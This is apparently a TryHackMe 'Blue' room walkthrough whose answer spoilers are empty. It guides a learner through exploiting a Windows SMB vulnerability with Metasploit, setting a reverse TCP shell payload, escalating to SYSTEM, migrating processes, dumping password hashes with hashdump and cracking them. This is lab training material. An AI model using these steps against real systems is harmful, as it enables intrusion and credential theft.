<p align="center">
   <img src="https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/blue/Blue_Cover.png" alt="Blue Logo">
</p>

# Blue

This guide contains the answer and steps necessary to get to them for the [Blue]([https://tryhackme.com/room/linuxfundamentalspart1](https://tryhackme.com/room/blue)) room.

## Table of contents

- [Recon](#recon)
- [Gain Access](#gain-access)
- [Escalate](#escalate)
- [Cracking](#cracking)
- [Find flags!](#find-flags)

### Recon



Scan the machine. (If you are unsure how to tackle this, I recommend checking out the Nmap room)

2. How many ports are open with a port number under 1000?

   

   ><details><summary>Click for answer</summary></details>

3. What is this machine vulnerable to? (Answer in the form of: ms??-???, ex: ms08-067)

   

   ><details><summary>Click for answer</summary></details>

### Gain Access



Start Metasploit

2. Find the exploitation code we will run against the machine. What is the full path of the code? (Ex: exploit/........)



   ><details><summary>Click for answer</summary></details>

3. Show options and set the one required value. What is the name of this value? (All caps for submission)



   ><details><summary>Click for answer</summary></details>

Usually it would be fine to run this exploit as is; however, for the sake of learning, you should do one more thing before exploiting the target. Enter the following command and press enter:

```cmd
set payload windows/x64/shell/reverse_tcp
```

With that done, run the exploit!

Confirm that the exploit has run correctly. You may have to press enter for the DOS shell to appear. Background this shell (CTRL + Z). If this failed, you may have to reboot the target VM. Try running it again before a reboot of the target. 

### Escalate




1. If you haven't already, background the previously gained shell (CTRL + Z). Research online how to convert a shell to meterpreter shell in metasploit. What is the name of the post module we will use? (Exact path, similar to the exploit we previously selected) 



   ><details><summary>Click for answer</summary></details>

2. Select this (use MODULE_PATH). Show options, what option are we required to change?



   ><details><summary>Click for answer</summary></details>

Set the required option, you may need to list all of the sessions to find your target here. 

Run! If this doesn't work, try completing the exploit from the previous task once more.

Once the meterpreter shell conversion completes, select that session for use.

Verify that we have escalated to NT AUTHORITY\SYSTEM. Run getsystem to confirm this. Feel free to open a dos shell via the command 'shell' and run 'whoami'. This should return that we are indeed system. Background this shell afterwards and select our meterpreter session for usage again. 

List all of the processes running via the 'ps' command. Just because we are system doesn't mean our process is. Find a process towards the bottom of this list that is running at NT AUTHORITY\SYSTEM and write down the process id (far left column).

Migrate to this process using the 'migrate PROCESS_ID' command where the process id is the one you just wrote down in the previous step. This may take several attempts, migrating processes is not very stable. If this fails, you may need to re-run the conversion process or reboot the machine and start once again. If this happens, try a different process next time. 



### Cracking




1. Within our elevated meterpreter shell, run the command 'hashdump'. This will dump all of the passwords on the machine as long as we have the correct privileges to do so. What is the name of the non-default user? 

   

   ><details><summary>Click for answer</summary></details>

2. Copy this password hash to a file and research how to crack it. What is the cracked password?

   

   ><details><summary>Click for answer</summary></details>

### Find flags!



1. Flag1? This flag can be found at the system root. 

   

   ><details><summary>Click for answer</summary></details>

2. Flag2? This flag can be found at the location where passwords are stored within Windows.

   

   ><details><summary>Click for answer</summary></details>

3. flag3? This flag can be found in an excellent location to loot. After all, Administrators usually have pretty interesting things saved. 

   

   ><details><summary>Click for answer</summary></details>
